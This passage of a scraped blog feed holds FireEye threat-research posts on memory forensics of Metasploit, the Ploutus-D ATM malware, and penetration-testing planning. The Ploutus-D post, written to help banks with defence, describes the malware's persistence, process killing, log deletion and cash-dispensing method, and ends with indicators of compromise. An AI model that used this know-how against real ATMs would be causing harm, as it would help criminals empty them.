href=\"http://www.cfreds.nist.gov/FileCarving/\">http://www.cfreds.nist.gov/FileCarving/</a>. There are many file carving tools out there, so if you have any recommendations, feel free to direct message me on Twitter <a href=\"https://twitter.com/marycheese\">@marycheese</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 10 Jan 2013 01:04:31 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-RAR-Header-in-Unallocated-Space.jpg","linkMd5":"6a8824b4c0442d596b3eb7c51f97f663","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn68@2020_4/2020/08/24/14-11-05-481_bf591e57d2e85d77.webp","destWidth":693,"destHeight":352,"sourceBytes":117085,"destBytes":81448,"author":"Mary Singh","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-RAR-Header-in-Unallocated-Space.jpg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn68@2020_4/2020/08/24/14-11-05-481_bf591e57d2e85d77.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-False-positive-RAR-Header-in-Unallocated-Space.jpg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn98@2020_4/2020/08/24/14-11-18-797_4039859a74879eaa.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-RAR-End-in-Unallocated-Space.jpg":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn87@2020_1/2020/08/24/14-11-10-778_25d9e98e27371c0c.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-Password-prompt.jpg":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn77@2020_4/2020/08/24/14-11-15-010_9cc85affccefd093.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-RAR-command-in-pagefile.sys_.jpg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn92@2020_5/2020/08/24/14-11-08-811_b37330de6afa53b3.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg":null},"publishedOrCreatedDate":1598278264211},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"The changing battlefield in Memory","link":"http://www.fireeye.com/blog/threat-research/2009/08/the-changing-battlefield-in-memory.html","description":"<div class=\"c00 c00v1\"> \n <p>Steve Davis and I gave a talk at Blackhat and at Defcon called <a href=\"http://www.blackhat.com/presentations/bh-usa-09/SILBERMAN/BHUSA09-Silberman-MetasploitAutopsy-SLIDES.pdf\"><i>Metasploit Autopsy: Reconstructing the scene of the crime.</i></a> Giving the talk was a blast; both Steve and I were thrilled to be given an opportunity to give a defensive security talk on the Metasploit track. During our talk and in several interviews, we stated that some aspects of computer security are a cat and mouse game. When you make a technique, tool, or other knowledge public people have a chance to analyze what you have done. This analysis can lead to better code, improvements to ideas, or in some cases the breaking of said tools. In the case of <a href=\"http://www.mandiant.com/software/msff.htm\">Metasploit Forensic Framework (MSFF)</a>, the newest release of Metasploit flat out broke MSFF. First, let me give you some background. When we first started writing the tool, we quickly realized that breaking MSFF would take a single line change to Meterpreter. The fix is simple. In our talk, we discussed that when meterpreter called <i>free</i> the received/sent packets were not scrubbed and lay around memory for hours. MSFF capitalized on this using <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\">Memoryze </a>to acquire the processes address space which included the process's freed memory. HD and crew were nice enough to wait to patch Meterpreter until after our talk. Meterpreter was patched Saturday with <i>memset</i>'s, which zero out the packet data before the memory is freed.</p> \n <p>With this fix, our current technique to reconstruct what Meterpreter sent or received does not work. The Metasploit project has broken that ability successfully (something we expected). Our detection will evolve, and HD discussed some ideas he had to make detecting the Meterpreter binary harder. Currently, MSFF can still be used to identify the injected binaries in a process's address space. The Meterpreter binary contains too much code and has too many features to effectively hide in memory. If and when HD patches the reflective loader to scrub Meterpreter's binary data, we'll update MSFF with some fix, more as a proof concept than anything else, to continue to identify the injected DLLs. Hope everyone's recovered from Vegas!</p> \n <p>A huge thanks go to Ping, Nikita, Jeff Moss, Val Smith and HD for putting the Metasploit track together. It was not easy, but it went great. A huge thanks to the defcon speakers, who were very flexible.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 13 Aug 2009 22:50:49 +0000","feedId":1226,"bgimg":"","linkMd5":"9282336fba09dc04f7a12c9bc6471260","bgimgJsdelivr":"","metaImg":"","author":"Peter Silberman","publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"New Variant of Ploutus ATM Malware Observed in the Wild in Latin America","link":"http://www.fireeye.com/blog/threat-research/2017/01/new_ploutus_variant.html","description":"<h4>Introduction</h4>\n <p>Ploutus is one of the most advanced ATM malware families we’ve seen\n  in the last few years. Discovered for the <a\n    href=\"https://www.symantec.com/connect/blogs/criminals-hit-atm-jackpot\">first\n    time in Mexico</a> back in 2013, Ploutus enabled criminals to empty\n  ATMs using either an external keyboard attached to the machine or <a\n    href=\"https://www.symantec.com/connect/blogs/texting-atms-cash-shows-cybercriminals-increasing-sophistication\">via\n    SMS message</a>, a technique that had never been seen before.</p>\n <p>FireEye Labs recently identified a previously unobserved version of\n  Ploutus, dubbed Ploutus-D, that interacts with KAL’s Kalignite\n  multivendor ATM platform. The samples we identified target the ATM\n  vendor Diebold. However, minimal code change to Ploutus-D would\n  greatly expand its ATM vendor targets since Kalignite Platform <a\n    href=\"http://www.kal.com/en/video/multi-vendor\">runs on 40 different\n    ATM vendors in 80 countries</a>.</p>\n <p>Once deployed to an ATM, Ploutus-D makes it possible for a money\n  mule to obtain thousands of dollars in minutes. A money mule must have\n  a master key to open the top portion of the ATM (or be able to pick\n  it), a physical keyboard to connect to the machine, and an activation\n  code (provided by the boss in charge of the operation) in order to\n  dispense money from the ATM. While there are some risks of the money\n  mule being caught by cameras, the speed in which the operation is\n  carried out minimizes the mule’s risk.</p>\n <p>This blog covers the changes, improvements, and Indicators of\n  Compromise (IOC) of Ploutus-D in order to help financial organizations\n  identify and defend against this threat.</p>\n <h4>Previously unobserved features of Ploutus-D</h4>\n <ul> <li>It uses the Kalignite multivendor ATM Platform.</li> <li>It\n    could run on ATMs running the Windows 10, Windows 8, Windows 7 and\n    XP operating systems.</li> <li>It is configured to control Diebold\n  ATMs.</li> <li>It has a different GUI interface.</li> <li>It comes\n    with a Launcher that attempts to identify and kill security\n    monitoring processes to avoid detection.</li> <li>It uses a stronger\n    .NET obfuscator called Reactor.</li> </ul>\n <h4>Commonality between Ploutus and Ploutus-D</h4>\n <ul> <li>The main purpose is to empty the ATM without requiring an ATM\n  card.</li> <li>The attacker must interact with the malware using an\n    external keyboard attached to the ATM.</li> <li>An activation code\n    is generated by the attacker, which expires after 24 hours.</li>\n    <li>Both were created in .NET.</li> <li>Can run as Windows Service\n    or standalone application.</li> </ul>\n <h4>Dissecting Ploutus-D</h4>\n <p>Ploutus-D (observed in the wild with the filename of\n  “AgilisConfigurationUtility.exe”) can run as a standalone application\n  or as a Windows service started by a Launcher (observed in the wild as\n  “Diebold.exe”). Although multiple functionality is shared between the\n  two components, the main difference is that Ploutus-D is the component\n  with the capability to dispense money.</p>\n <h5>Launcher – Diebold.exe (.NET)</h5>\n <table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>MD5</p> </td> <td width=\"221\"\n        valign=\"top\"><p>C04A7CB926CCBF829D0A36A91EBF91BD</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>.NET Obfuscator</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Reactor</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>File Size</p> </td> <td\n        width=\"221\" valign=\"top\"><p>198 kB</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>File Type</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Win32 EXE</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Time Stamp</p> </td> <td\n        width=\"221\" valign=\"top\"><p>2016:11:16 04:55:56-08:00</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Code Size</p> </td> <td\n        width=\"221\" valign=\"top\"><p>199168</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>File Version</p> </td> <td\n        width=\"221\" valign=\"top\"><p>0.0.0.1</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Internal Name</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Diebold.exe</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Legal Copyright</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Copyright ©  2015</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Original Filename</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Diebold.exe</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Product Name</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Diebold</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Product Version</p> </td> <td\n        width=\"221\" valign=\"top\"><p>0.0.0.1</p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Table 1: Launcher Properties</span></p>\n <p>This time, the attackers put more effort into trying to obfuscate\n  and protect their code from reverse engineering by switching from .NET\n  Confuser to Reactor. A quick look at how the protected code appears is\n  shown in Figure 1.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig1.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 1: Code protected by Reactor</span></p>\n <h5>Inspecting the Launcher</h5>\n <p>Once the code is deobfuscated, it is easy to understand the internal\n  workings. Before the Launcher execution starts, it will perform an\n  integrity check on itself to make sure it has not been altered.</p>\n <p>The Launcher can receive different arguments in the command line to\n  either install as a service, run Ploutus-D, or uninstall from the\n  machine. The service properties can be seen in Figure 2.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig2.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 2: Service Description of the Launcher</span></p>\n <h5>Persistence</h5>\n <p>Using a very common persistence technique, the malware will add\n  itself to the “Userinit” registry key to allow execution after every\n  reboot. The key is located at:</p>\n <p>\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</p>\n <h5>Interacting with the Launcher</h5>\n <p>The attacker must interact with the Launcher by attaching a keyboard\n  to the ATM USB or PS/2 port. Figure 3 below shows an example of this setup.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig3.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 3: Keyboard attached to the ATM port</span></p>\n <p>Once the Launcher has been installed in the ATM, it will perform\n  keyboard hooking in order to read the instructions from the attackers\n  via the external keyboard. A combination of “F” keys will be used to\n  request the action to execute (see Figure 4).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig4.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 4: Interacting with the Launcher via keyboard</span></p>\n <p>The main tasks supported are:</p>\n <ul> <li>Start programs on demand, some of which are decrypted from the\n    resource section of the Launcher:<ul> <li>C:\\Program\n        Files\\Diebold\\Agilis Startup\\AgilisShellStart.exe</li>\n      <li>Main.exe</li> <li>XFSConsole.exe</li> </ul> </li> <li>Kill\n      Processes:<ul> <li>NHOSTSVC.exe</li>\n      <li>AgilisConfigurationUtility.exe</li> <li>XFSConsole.exe</li>\n    </ul> </li> <li>Delete Files:<ul> <li>NetOp.LOG – Secure Remote\n        Management solution</li> </ul> </li> <li>Reboot Machine:<ul>\n        <li>“wmic os where Primary='TRUE' reboot”</li> </ul> </li> </ul>\n <p>As seen in Figure 5, a request has been sent to run Ploutus-D\n  (AgilisConfigurationUtility.exe) from command line.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig5.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 5: Starting Ploutus-D by the Launcher</span></p>\n <p>Legitimate KAL ATM software is dropped into the system along with\n  Ploutus-D, as shown in the Figure 6. The reason for this is to make\n  sure that all the software and versions needed to properly run the\n  malware are present in the same folder to avoid any dependency issues.\n  The same technique was also used by the first version of Ploutus.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Picture6.png\" alt=\"\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 6: Dropped files by the Launcher</span></p>\n <p>The K3A.Platform.dll DLL will load the Kalignite Platform to allow\n  Ploutus-D to control the ATM.</p>\n <p>This shows that the attackers likely have access to the targeted ATM\n  software. They can either buy physical ATMs from authorized resellers,\n  which come preloaded with vendor software, or they could just steal\n  the ATMs directly from the bank’s facility. An example of a real\n  incident reported in Mexico is shown in Figure 7.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig7.jpg\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 7: Attackers physically stealing ATMs</span></p>\n <h5>Ploutus-D – AgilisConfigurationUtility.exe (.NET)</h5>\n <table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>MD5</p> </td> <td width=\"221\"\n        valign=\"top\"><p>5AF1F92832378772A7E3B07A0CAD4FC5</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>.NET Obfuscator</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Reactor</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>File Size</p> </td> <td\n        width=\"221\" valign=\"top\"><p>274 kB</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>File Type</p> </td> <td\n        width=\"221\" valign=\"top\"><p>Win32 EXE</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Time Stamp</p> </td> <td\n        width=\"221\" valign=\"top\"><p>1992:06:19 15:22:17-07:00</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Code Size</p> </td> <td\n        width=\"221\" valign=\"top\"><p>29696</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>OS Version</p> </td> <td\n        width=\"221\" valign=\"top\"><p>4.0</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Image Version</p> </td> <td\n        width=\"221\" valign=\"top\"><p>0.0</p> </td> </tr>\n    <tr>\n      <td width=\"221\" valign=\"top\"><p>Subsystem Version</p> </td> <td\n        width=\"221\" valign=\"top\"><p>4.0</p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Table 2: Ploutus-D Properties</span></p>\n <p>Similar to the Launcher, this binary also came protected with\n  Reactor obfuscator (see Figure 8).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig8.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 8. Protected with Reactor</span></p>\n <p>Looking at the unprotected code (see Figure 9), the connection with\n  Ploutus became evident since the names of most of the functions are\n  the same as in the first version.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig9.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 9: Unprotected code</span></p>\n <p>Ploutus-D will make sure a mutex with the name “KaligniteAPP” does\n  not exist in the system in order to start running. Similar to the\n  Launcher, Ploutus-D will hook the keyboard in order for the attackers\n  to interact with it; however, apart from receiving commands from “F”\n  keys, it will also read from the numeric pad (numbers).</p>\n <p>Similar to the previous version, the GUI will be enabled by entering\n  a combination of “F” keys. Then, a valid 8-digit code must be entered\n  in the GUI in order to be able to dispense money. Ploutus-D also\n  allows the attackers to enter the amount to withdraw (billUnits – 4\n  digits) and the number of cycles (billCount – 2 digits) to repeat the\n  dispensing operation (see Figure 10).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig10.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 10: Parsing amount and cycles</span></p>\n <p>The Ploutus-D GUI is displayed in Figure 11. It is configured to\n  list properties of 18 cassettes (C1-C18). Letter “D” shows the status\n  of the cassette and “CV” is a value taken from the registry. The\n  message “Estado:Activado”, which means “State: Activated”, is\n  displayed if a valid code has been entered. The ATM ID and HW_ID are\n  unique to the ATM. The amount to be retrieved is displayed as:\n  “Cantidad: 500” (default value if no amount entered in the GUI). The\n  total amount depends on the currency, which is also calculated by the malware.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Picture11.png\" alt=\"\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 11: Ploutus-D GUI enabled</span></p>\n <p>All the actions are logged into a file with the name “Log.txt”. An\n  extract can be seen in Figure 12.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig12.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 12: Log File recording actions</span></p>\n <h4>Dispensing the Money</h4>\n <p>In order for the mule to be able to start dispensing money, a valid\n  8-digit code must be entered. This code is provided by the boss in\n  charge of the operation and is calculated based on a unique ID\n  generated per ATM, and the current month and day of the attack.</p>\n <p>Once a valid activation code has been entered (which expires in 24\n  hours), the dispensing process will start by pressing “F3” from the\n  external keyboard.</p>\n <p>The malware will first identify the cassette’s denomination by\n  querying the registry denomination table from Diebold Dispenser\n  Logical Name “DBD_AdvFuncDisp” at:</p>\n <p>\\HKLM\\SOFTWARE\\XFS\\PHYSICAL_SERVICES\\DBD_AdvFuncDisp\\Denomination Table</p>\n <p>A similar strategy will be used to get the cassette’s status and\n  type, to make sure they are working properly, and, more important, to\n  identify that it has at least one bill to withdraw.</p>\n <p>Ploutus-D will load “KXCashDispenserLib” library implemented by\n  Kalignite Platform (K3A.Platform.dll) to interact with the XFS Manager\n  and control the Dispenser (see Figure 13).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig13.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 13: Loading Dispenser Class</span></p>\n <p>Figure 14 shows a graphical representation of the XFS Manager and\n  its interaction with Kalignite Platform via KXCashDispenserLib.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig14.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 14: XFS Manager</span></p>\n <p>The knowledge shown in the code to properly implement all the\n  different classes and methods to control the Dispenser suggests that\n  the developers of the malware have either access to real ATMs during\n  the development or they hired individuals with experience coding on\n  these machines.</p>\n <h4>Expanding Ploutus to other ATM vendors</h4>\n <p>Kalignite Platform is said to support 40 ATM vendors. Looking at the\n  code to dispense money, the only pieces adjusted to target Diebold are\n  the different registry keys to read the cassette (DBD_AdvFuncDisp)\n  parameters (see Figure 15).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig15.png\" /></p>\n <p>\n  <span class=\"type-XS\">Figure 15: Getting Diebold Cassette parameters</span></p>\n <p>Since Ploutus-D interacts with the Kalignite Platform, only minor\n  modifications to the Ploutus-D code may be required to target\n  different ATM vendors worldwide.</p>\n <h4>Conclusion</h4>\n <p>As anticipated in our <a\n    href=\"https://www.fireeye.com/blog/executive-perspective/2016/11/questions_and_answer.html\">2017\n    predictions report</a>, the use of ATM malware will continue to\n  increase, especially in underdeveloped countries with weaker physical\n  security controls. By leveraging the Kalignite Platform, Ploutus can\n  be easily modified to attack various ATM vendors and operating systems.</p>\n <h4>Frequently Asked Questions</h4>\n <ol> <li>When was Ploutus-D first discovered?<ul> <li>Ploutus-D was\n        uploaded to VirusTotal in November 2016.</li> </ul> </li>\n    <li>Does Ploutus-D target cardholder information?<ul> <li>No. It is\n        designed to dispense cash from within the ATM.</li> </ul> </li>\n    <li>Is Ploutus-D already affecting ATMs in the wild?<ul> <li>Yes. It\n        has been observed in Latin America.</li> </ul> </li> <li>What\n    type of ATMs are affected?<ul> <li>Ploutus-D affects Diebold\n      ATMs.</li> <li>Minor modifications could be made to Ploutus-D to\n        affect other vendors using the Kalignite Platform.</li> </ul>\n  </li> <li>How is Ploutus-D installed on the ATM?<ul> <li>Through\n        physical access to the ATM.</li> </ul> </li> <li>How do\n    attackers interact with Ploutus-D?<ul> <li>Via an external keyboard\n        that needs to be connected to the ATM.</li> </ul> </li> </ol>\n <h4>IOCs</h4>\n <h5>FileSystem:</h5>\n <p>[D-Z]:\\Data\\P.bin<br /> C:\\Diebold\\EDC\\edclocal.dat</p>\n <p>The following files should be found at the same place where the\n  service Diebold.exe is located:</p>\n <p>Log.txt<br /> Log2.txt<br /> P.bin – Mac address of the system, plus\n  string: “PLOUTUS-MADE-IN-LATIN-AMERICA-XD”<br /> PDLL.bin – Encoded\n  version of P.bin</p>\n <h5>Mutex names:</h5>\n <p>Ploutos<br /> DIEBOLDPL<br /> KaligniteAPP</p>\n <h5>Services:</h5>\n <p>Service Name: DIEBOLDP</p>\n <h5>Registry:</h5>\n <p>\\\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit=”Diebold.exe,%system32%/userinit.exe”</p>\n","descriptionType":"html","publishedDate":"Thu, 12 Jan 2017 01:45:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig1.png","linkMd5":"e71d772c6d67c49bd9e8d753bf9dc53a","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn96@2020_5/2020/08/24/14-11-06-637_9f8576921297f2a4.webp","destWidth":214,"destHeight":469,"sourceBytes":8085,"destBytes":22962,"author":"Daniel Regalado","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn96@2020_5/2020/08/24/14-11-06-637_9f8576921297f2a4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn20@2020_6/2020/08/24/14-11-21-403_d0cd08e6f33cf940.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn50@2020_6/2020/08/24/14-11-20-231_60eb062c54a6adc4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig4.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn63@2020_1/2020/08/24/14-11-19-783_11da566b2ad0636e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig5.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn6@2020_6/2020/08/24/14-11-16-145_313356751cc7bf5f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn91@2020_5/2020/08/24/14-11-19-690_6a03e7e4766d7f3f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig7.jpg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn41@2020_6/2020/08/24/14-11-20-195_980c7dffab895f17.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig8.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn13@2020_3/2020/08/24/14-11-17-210_e283f49ad2fe124f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig9.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn51@2020_2/2020/08/24/14-11-12-295_ac8b1751179cc39c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig10.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn90@2020_5/2020/08/24/14-11-13-747_337df1f23394cbeb.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Picture11.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn7@2020_4/2020/08/24/14-11-08-806_d6a4e47ca4d008f2.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig12.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn58@2020_6/2020/08/24/14-11-15-574_ebb617fc3d166ffd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig13.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn26@2020_4/2020/08/24/14-11-13-214_892ab3859d56df21.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig14.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn19@2020_2/2020/08/24/14-11-12-023_f6c2d8260886e129.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig15.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn4@2020_1/2020/08/24/14-11-11-009_6675adfa00445d1a.webp"},"publishedOrCreatedDate":1598278264201},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"The Five W’s of Penetration Testing","link":"http://www.fireeye.com/blog/threat-research/2014/09/ws-penetration-testing.html","description":"<div class=\"c00 c00v1\"> \n <p>Often in discussions with customers and potential customers, questions arise about our <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/penetration-testing.html\" target=\"_self\">penetration testing services</a>, as well as penetration testing in general. In this post, we want to walk through Mandiant's take on the five W's of penetration testing, in hopes of helping those of you who many have some of these same questions. For clarity, we are going to walk through these W's in a non-traditional order.</p> \n <p> <b>Why</b></p> \n <p>First and foremost, it's important to be upfront with yourself with why you are having a penetration test performed (or at least considering one). If your organization's primary motivation is compliance and needing to \"check the box,\" then be on the lookout for your people attempting to subtly (or not so subtly) hinder the test in order to earn an \"easy pass\" by minimizing the number of findings (and therefore the amount of potential remediation work required). Individuals could attempt to hinder a penetration test by placing undue restrictions on the scope of systems assessed, the types of tools that can be used, or the timing of the test.</p> \n <p>Even if compliance is a motivating factor, we hope you're able to take advantage of the opportunity penetration testing provides to determine where vulnerabilities lie and make your systems more secure. That is the real value that penetration testing can provide.</p> \n <p>Finally, if you are getting a penetration test to comply with requirements imposed on your organization, that will often drive some of the answers to later questions about the type and scope of the test. Keep in mind that standards only dictate minimum requirements, however, so you should also consider additional penetration testing activities beyond the \"bare minimum.\"</p> \n <p> <b>Who</b></p> \n <p>There are really two \"who\" questions to consider, but for now we will just deal with the first: Who are the attackers that concern you? Are they:</p> \n <ol> \n  <li>Random individuals on the Internet?</li> \n  <li>Specific threat actors, such as state-sponsored attackers, organized criminals, or hacktivist groups?</li> \n  <li>An individual or malware that is behind the firewall and on your internal corporate network?</li> \n  <li>Your own employees (\"insider threats\")?</li> \n  <li>Your customers (or attackers who may compromise customers' systems/accounts)?</li> \n  <li>Your vendors, service providers, and other business partners (or attackers who may have compromised their systems)?</li> \n </ol> \n <p>The answer to this will help drive the type of testing to be performed and the types of test user accounts (if any) to provision. The next section will describe some possible penetration test types, but it's helpful to also discuss the types of attackers you would like the penetration test to simulate.</p> \n <p> <b>What</b></p> \n <p>What type of penetration test do you want performed? For organizations new to penetration testing, we recommend starting with an external network penetration test, which will assess your Internet-accessible systems in the same way that an attacker anywhere in the world could access them. Beyond that, there are several options:</p> \n <ol> \n  <li>Internal network penetration test - A penetration test of your internal corporate network. Typically we start these types of assessments with only a network connection on the corporate networks, but a common variant is what we call an \"Insider Threat Assessment,\" where we start with one of your standard workstations and a standard user account.</li> \n  <li>Web application security assessment - A review of custom web application code for security vulnerabilities such as access control issues, SQL injection, cross-site scripting (XSS) and others. These are best done in a test or development environment to minimize impact to the production environment.</li> \n  <li>Social engineering - Using deceptive email, phone calls, and/or physical entry to gain access to systems.</li> \n  <li>Wireless penetration test - A detailed security assessment of wireless network(s) at one or more of your locations. This typically includes a survey of the location looking for unauthorized (\"rogue\") wireless access points that have been connected to the corporate network and are often insecurely configured.</li> \n </ol> \n <p>If budgets were not an issue, you would want to do all of the above, but in reality you will need to prioritize your efforts on what makes sense for your organization. Keep in mind that the best approach may change over time as your organization matures.</p> \n <p> <b>Where</b></p> \n <p>In what physical location should the test take place? Many types of penetration testing can be done remotely, but some require the testers to visit your facility. Physical social engineering engagements and wireless assessments clearly need to be performed at one (or more) of your locations.</p> \n <p>Some internal penetration tests can be done remotely via a VPN connection, but we recommend conducting them at your location whenever possible. If your internal network has segmentation in place (as we 